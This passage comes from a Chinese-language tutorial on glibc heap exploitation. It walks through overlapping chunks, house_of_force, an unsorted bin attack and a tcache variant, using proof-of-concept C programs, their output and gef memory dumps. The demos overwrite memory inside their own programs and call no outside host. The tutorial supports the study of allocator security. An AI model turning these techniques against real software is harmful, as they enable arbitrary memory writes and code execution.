+0x602080:    0x4141414141414141    0x4141414141414141
+0x602090:    0x4141414141414141    0x4141414141414141
+0x6020a0:    0x4141414141414141    0x4141414141414141
+0x6020b0:    0x4141414141414141    0x0000000000000091  <-- chunk 3
+0x6020c0:    0x4141414141414141    0x4141414141414141
+0x6020d0:    0x4141414141414141    0x4141414141414141
+0x6020e0:    0x4141414141414141    0x4141414141414141
+0x6020f0:    0x4141414141414141    0x4141414141414141
+0x602100:    0x4141414141414141    0x4141414141414141
+0x602110:    0x4141414141414141    0x4141414141414141
+0x602120:    0x4141414141414141    0x4141414141414141
+0x602130:    0x4141414141414141    0x4141414141414141
+0x602140:    0x4141414141414141    0x0000000000000091  <-- chunk 4 [be freed]
+0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
+0x602160:    0x4141414141414141    0x4141414141414141
+0x602170:    0x4141414141414141    0x4141414141414141
+0x602180:    0x4141414141414141    0x4141414141414141
+0x602190:    0x4141414141414141    0x4141414141414141
+0x6021a0:    0x4141414141414141    0x4141414141414141
+0x6021b0:    0x4141414141414141    0x4141414141414141
+0x6021c0:    0x4141414141414141    0x4141414141414141
+0x6021d0:    0x0000000000000090    0x0000000000000020  <-- chunk 5 <-- prev_size
+0x6021e0:    0x4141414141414141    0x4141414141414141
+0x6021f0:    0x4141414141414141    0x0000000000020e11  <-- top chunk
+0x602200:    0x0000000000000000    0x0000000000000000
+0x602210:    0x0000000000000000    0x0000000000000000
+0x602220:    0x0000000000000000    0x0000000000000000
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x602140, bk=0x602140
+ →   Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE)
+```
+
+free chunk 4 被放入 unsorted bin，大小为 0x90。
+
+接下来是最关键的一步，利用 chunk 1 的溢出漏洞，将 chunk 2 的 size 值修改为 chunk 2 和 chunk 3 的大小之和，即 0x90+0x90+0x1=0x121，最后的 1 是标志位。这样当我们释放 chunk 2 的时候，malloc 根据这个被修改的 size 值，会以为 chunk 2 加上 chunk 3 的区域都是要释放的，然后就错误地修改了 chunk 5 的 prev_size。接着，它发现紧邻的一块 chunk 4 也是 free 状态，就把它俩合并在了一起，组成一个大 free chunk，放进 unsorted bin 中。
+
+```c
+gef➤  x/70gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0x00000000000001b1  <-- chunk 2 [be freed] <-- unsorted bin
+0x602030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
+0x602040:    0x4141414141414141    0x4141414141414141
+0x602050:    0x4141414141414141    0x4141414141414141
+0x602060:    0x4141414141414141    0x4141414141414141
+0x602070:    0x4141414141414141    0x4141414141414141
+0x602080:    0x4141414141414141    0x4141414141414141
+0x602090:    0x4141414141414141    0x4141414141414141
+0x6020a0:    0x4141414141414141    0x4141414141414141
+0x6020b0:    0x4141414141414141    0x0000000000000091  <-- chunk 3
+0x6020c0:    0x4141414141414141    0x4141414141414141
+0x6020d0:    0x4141414141414141    0x4141414141414141
+0x6020e0:    0x4141414141414141    0x4141414141414141
+0x6020f0:    0x4141414141414141    0x4141414141414141
+0x602100:    0x4141414141414141    0x4141414141414141
+0x602110:    0x4141414141414141    0x4141414141414141
+0x602120:    0x4141414141414141    0x4141414141414141
+0x602130:    0x4141414141414141    0x4141414141414141
+0x602140:    0x4141414141414141    0x0000000000000091  <-- chunk 4 [be freed]
+0x602150:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
+0x602160:    0x4141414141414141    0x4141414141414141
+0x602170:    0x4141414141414141    0x4141414141414141
+0x602180:    0x4141414141414141    0x4141414141414141
+0x602190:    0x4141414141414141    0x4141414141414141
+0x6021a0:    0x4141414141414141    0x4141414141414141
+0x6021b0:    0x4141414141414141    0x4141414141414141
+0x6021c0:    0x4141414141414141    0x4141414141414141
+0x6021d0:    0x00000000000001b0    0x0000000000000020  <-- chunk 5 <-- prev_size
+0x6021e0:    0x4141414141414141    0x4141414141414141
+0x6021f0:    0x4141414141414141    0x0000000000020e11  <-- top chunk
+0x602200:    0x0000000000000000    0x0000000000000000
+0x602210:    0x0000000000000000    0x0000000000000000
+0x602220:    0x0000000000000000    0x0000000000000000
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x602020, bk=0x602020
+ →   Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE)
+```
+
+现在 unsorted bin 里的 chunk 的大小为 0x1b0，即 0x90*3。咦，所以 chunk 3 虽然是使用状态，但也被强行算在了 free chunk 的空间里了。
+
+最后，如果我们分配一块大小为 0x1b0-0x10 的大空间，返回的堆块即是包括了 chunk 2 + chunk 3 + chunk 4 的大 chunk。这时 chunk 6 和 chunk 3 就重叠了，结果就像上面运行时打印出来的一样。
+
+
+
+### house_of_force
+
+在`glibc 2.23`下，通过控制`top chunk`的`size`域为一个特别大的值，导致可以通过`malloc`特别大的值或者负数来将`top chunk`的指针指向任意位置。
+
+```c
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <malloc.h>
+
+char bss_var[] = "This is a string that we want to overwrite.";
+
+int main() {
+    fprintf(stderr, "We will overwrite a variable at %p\n\n", bss_var);
+
+    intptr_t *p1 = malloc(0x10);
+    int real_size = malloc_usable_size(p1);
+    memset(p1, 'A', real_size);
+    fprintf(stderr, "Let's allocate the first chunk of 0x10 bytes: %p.\n", p1);
+    fprintf(stderr, "Real size of our allocated chunk is 0x%x.\n\n", real_size);
+
+    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
+    fprintf(stderr, "Overwriting the top chunk size with a big value so the malloc will never call mmap.\n");
+    fprintf(stderr, "Old size of top chunk: %#llx\n", *((unsigned long long int *)ptr_top));
+    ptr_top[0] = -1;
+    fprintf(stderr, "New size of top chunk: %#llx\n", *((unsigned long long int *)ptr_top));
+
+    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
+    fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
+    void *new_ptr = malloc(evil_size);
+    int real_size_new = malloc_usable_size(new_ptr);
+    memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20);
+    fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);
+
+    void* ctr_chunk = malloc(0x30);
+    fprintf(stderr, "malloc(0x30) => %p!\n", ctr_chunk);
+    fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\n");
+
+    fprintf(stderr, "old string: %s\n", bss_var);
+    strcpy(ctr_chunk, "YEAH!!!");
+    fprintf(stderr, "new string: %s\n", bss_var);
+}
+
+```
+
+```c
+$ gcc -g house_of_force.c
+$ ./a.out
+We will overwrite a variable at 0x601080
+
+Let's allocate the first chunk of 0x10 bytes: 0x824010.
+Real size of our allocated chunk is 0x18.
+
+Overwriting the top chunk size with a big value so the malloc will never call mmap.
+Old size of top chunk: 0x20fe1
+New size of top chunk: 0xffffffffffffffff
+
+The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes.
+As expected, the new pointer is at the same place as the old top chunk: 0x824030
+malloc(0x30) => 0x601080!
+
+Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.
+old string: This is a string that we want to overwrite.
+new string: YEAH!!!
+```
+
+我们知道在空闲内存的最高处，必然存在一块空闲的 chunk，即 top chunk，当 bins 和 fast bins 都不能满足分配需要的时候，malloc 会从 top chunk 中分出一块内存给用户。
+
+当存在堆溢出漏洞时，可以改写 top chunk 的头部，然后将其改为一个非常大的值（0xffffffffffffffff 即 -1），以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地址处的内存。
+
+在计算机中，地址是无符号整数。利用整数溢出，如果我们加一个非常大的数，效果等同于减去一个数，从而让指针“回绕”到低地址
+
+```c
+目标地址：bss_var (0x601080)
+Top Chunk：0x824028
+计算结果：0xffffffffffddd048
+当malloc(0xffffffffffddd048)时，通过地址溢出计算，新的chunk起始地址便在0x601080处
+```
+
+首先随意分配一个 chunk，此时内存里存在两个 chunk，即 chunk 1 和 top chunk：
+
+```c
+gef➤  x/8gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0x0000000000020fe1  <-- top chunk
+0x602030:    0x0000000000000000    0x0000000000000000
+```
+
+chunk 1 真实可用的内存有 0x18 字节。
+
+假设 chunk 1 存在溢出，利用该漏洞我们现在将 top chunk 的 size 值改为一个非常大的数：-1
+
+```c
+gef➤  x/8gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000021  <-- chunk 1
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0xffffffffffffffff  <-- modified top chunk
+0x602030:    0x0000000000000000    0x0000000000000000
+```
+
+改写之后的 size==0xffffffffffffffff
+
+现在我们可以 malloc 一个任意大小的内存而不用调用 mmap 了。接下来 malloc 一个 chunk，使得该 chunk 刚好分配到我们想要控制的那块区域为止，这样的话，topchunk就被我们修改到目标区域了，在下一次 malloc 时，就可以返回到我们想要控制的区域了。计算方法是用**目标地址减去 top chunk 地址，再减去 chunk 头的大小**
+
+```c
+gef➤  x/8gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000021
+0x602010:    0x4141414141414141    0x4141414141414141
+0x602020:    0x4141414141414141    0xfffffffffffff051
+0x602030:    0x0000000000000000    0x0000000000000000
+gef➤  x/12gx 0x602010+0xfffffffffffff050
+0x601060:    0x4141414141414141    0x4141414141414141
+0x601070:    0x4141414141414141    0x0000000000000fa9  <-- top chunk
+0x601080 <bss_var>:    0x2073692073696854    0x676e697274732061  <-- target
+0x601090 <bss_var+16>:    0x6577207461687420    0x6f7420746e617720
+0x6010a0 <bss_var+32>:    0x6972777265766f20    0x00000000002e6574
+0x6010b0:    0x0000000000000000    0x0000000000000000
+```
+
+再次 malloc，将目标地址包含进来即可，现在我们就成功控制了目标内存：
+
+```c
+gef➤  x/12gx 0x602010+0xfffffffffffff050
+0x601060:    0x4141414141414141    0x4141414141414141
+0x601070:    0x4141414141414141    0x0000000000000041  <-- chunk 2
+0x601080 <bss_var>:    0x2073692073696854    0x676e697274732061  <-- target
+0x601090 <bss_var+16>:    0x6577207461687420    0x6f7420746e617720
+0x6010a0 <bss_var+32>:    0x6972777265766f20    0x00000000002e6574
+0x6010b0:    0x0000000000000000    0x0000000000000f69  <-- top chunk
+```
+
+
+
+
+
+### unsorted_bin_attack
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    unsigned long stack_var = 0;
+    fprintf(stderr, "The target we want to rewrite on stack: %p -> %ld\n\n", &stack_var, stack_var);
+
+    unsigned long *p  = malloc(0x80);
+    unsigned long *p1 = malloc(0x10);
+    fprintf(stderr, "Now, we allocate first small chunk on the heap at: %p\n",p);
+
+    free(p);
+    fprintf(stderr, "We free the first chunk now. Its bk pointer point to %p\n", (void*)p[1]);
+
+    p[1] = (unsigned long)(&stack_var - 2);
+    fprintf(stderr, "We write it with the target address-0x10: %p\n\n", (void*)p[1]);
+
+    malloc(0x80);
+    fprintf(stderr, "Let's malloc again to get the chunk we just free: %p -> %p\n", &stack_var, (void*)stack_var);
+
+```
+
+```c
+$ gcc -g unsorted_bin_attack.c
+$ ./a.out
+The target we want to rewrite on stack: 0x7ffc9b1d61b0 -> 0
+
+Now, we allocate first small chunk on the heap at: 0x1066010
+We free the first chunk now. Its bk pointer point to 0x7f2404cf5b78
+We write it with the target address-0x10: 0x7ffc9b1d61a0
+
+Let's malloc again to get the chunk we just free: 0x7ffc9b1d61b0 -> 0x7f2404cf5b78
+```
+
+unsorted bin 攻击通常是为更进一步的攻击做准备的，我们知道 unsorted bin 是一个双向链表，在分配时会通过 unlink 操作将 chunk 从链表中移除，所以如果能够控制 unsorted bin chunk 的 bk 指针，就可以向任意位置写入一个指针。这里通过 unlink 将 libc 的信息写入到我们可控的内存中，从而导致信息泄漏，为进一步的攻击提供便利。
+
+unlink 的对 unsorted bin 的操作是这样的：
+
+```c
+          /* remove from unsorted list */
+          unsorted_chunks (av)->bk = bck;
+          bck->fd = unsorted_chunks (av);
+```
+
+其中 `bck = victim->bk`
+
+首先分配两个 chunk，然后释放掉第一个，它将被加入到 unsorted bin 中：
+
+```c
+gef➤  x/26gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 1 [be freed]
+0x602010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      <-- fd, bk pointer
+0x602020:    0x0000000000000000    0x0000000000000000
+0x602030:    0x0000000000000000    0x0000000000000000
+0x602040:    0x0000000000000000    0x0000000000000000
+0x602050:    0x0000000000000000    0x0000000000000000
+0x602060:    0x0000000000000000    0x0000000000000000
+0x602070:    0x0000000000000000    0x0000000000000000
+0x602080:    0x0000000000000000    0x0000000000000000
+0x602090:    0x0000000000000090    0x0000000000000020  <-- chunk 2
+0x6020a0:    0x0000000000000000    0x0000000000000000
+0x6020b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
+0x6020c0:    0x0000000000000000    0x0000000000000000
+gef➤  x/4gx &stack_var-2
+0x7fffffffdc50:    0x00007fffffffdd60    0x0000000000400712
+0x7fffffffdc60:    0x0000000000000000    0x0000000000602010
+gef➤  heap bins unsorted
+[ Unsorted Bin for arena 'main_arena' ]
+[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
+ →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)
+```
+
+然后假设存在一个溢出漏洞，可以让我们修改 chunk 1 的数据。然后我们将 chunk 1 的 bk 指针修改为指向目标地址 - 2，也就相当于是在目标地址处有一个 fake free chunk，然后 malloc：
+
+```c
+gef➤  x/26gx 0x602010-0x10
+0x602000:    0x0000000000000000    0x0000000000000091  <-- chunk 3
+0x602010:    0x00007ffff7dd1b78    0x00007fffffffdc50
+0x602020:    0x0000000000000000    0x0000000000000000
+0x602030:    0x0000000000000000    0x0000000000000000
+0x602040:    0x0000000000000000    0x0000000000000000
+0x602050:    0x0000000000000000    0x0000000000000000
+0x602060:    0x0000000000000000    0x0000000000000000
+0x602070:    0x0000000000000000    0x0000000000000000
+0x602080:    0x0000000000000000    0x0000000000000000
+0x602090:    0x0000000000000090    0x0000000000000021  <-- chunk 2
+0x6020a0:    0x0000000000000000    0x0000000000000000
+0x6020b0:    0x0000000000000000    0x0000000000020f51  <-- top chunk
+0x6020c0:    0x0000000000000000    0x0000000000000000
+gef➤  x/4gx &stack_var-2
+0x7fffffffdc50:    0x00007fffffffdc80    0x0000000000400756  <-- fake chunk
+0x7fffffffdc60:    0x00007ffff7dd1b78    0x0000000000602010      <-- fd->TAIL,目标地址已经被修改为unsorted bin头部地址
+```
+
+从而泄漏了 unsorted bin 的头部地址。
+
+#### libc 2.27
+
+利用tcache posioning
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    unsigned long stack_var = 0;
+    fprintf(stderr, "The target we want to rewrite on stack: %p -> %ld\n\n", &stack_var, stack_var);
+
+    unsigned long *p = malloc(0x80);
+    unsigned long *p1 = malloc(0x10);
+    fprintf(stderr, "Now, we allocate first small chunk on the heap at: %p\n",p);
+
+    free(p);
+    fprintf(stderr, "Freed the first chunk to put it in a tcache bin\n");
+
+    p[0] = (unsigned long)(&stack_var);
+    fprintf(stderr, "Overwrite the next ptr with the target address\n");
+    malloc(0x80);
+    malloc(0x80);
+    fprintf(stderr, "Now we malloc twice to make tcache struct's counts '0xff'\n\n");
+
+    free(p);
+    fprintf(stderr, "Now free again to put it in unsorted bin\n");
+    p[1] = (unsigned long)(&stack_var - 2);
+    fprintf(stderr, "Now write its bk ptr with the target address-0x10: %p\n\n", (void*)p[1]);
+
+    malloc(0x80);
+    fprintf(stderr, "Finally malloc again to get the chunk at target address: %p -> %p\n", &stack_var, (void*)stack_var);
+}
+```
+
+```c
+$ gcc -g tcache_unsorted_bin_attack.c
+$ ./a.out
+The target we want to rewrite on stack: 0x7ffef0884c10 -> 0
+
+Now, we allocate first small chunk on the heap at: 0x564866907260
+Freed the first chunk to put it in a tcache bin
+Overwrite the next ptr with the target address
+Now we malloc twice to make tcache struct's counts '0xff'
+
+Now free again to put it in unsorted bin
+Now write its bk ptr with the target address-0x10: 0x7ffef0884c00
+
+Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -> 0x7f69ba1d8ca0
+```
+
+我们知道由于 tcache 的存在，malloc 从 unsorted bin 取 chunk 的时候，如果对应的 tcache bin 还未装满，则会将 unsorted bin 里的 chunk 全部放进对应的 tcache bin，然后再从 tcache bin 中取出。那么问题就来了，在放进 tcache bin 的这个过程中，malloc 会以为我们的 target address 也是一个 chunk，然而这个 "chunk" 是过不了检查的，将抛出 "memory corruption" 的错误：
+
+```c
+      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+        {
+          bck = victim->bk;
+          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
+              || __builtin_expect (chunksize_nomask (victim)
+                   > av->system_mem, 0))
+            malloc_printerr ("malloc(): memory corruption");
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
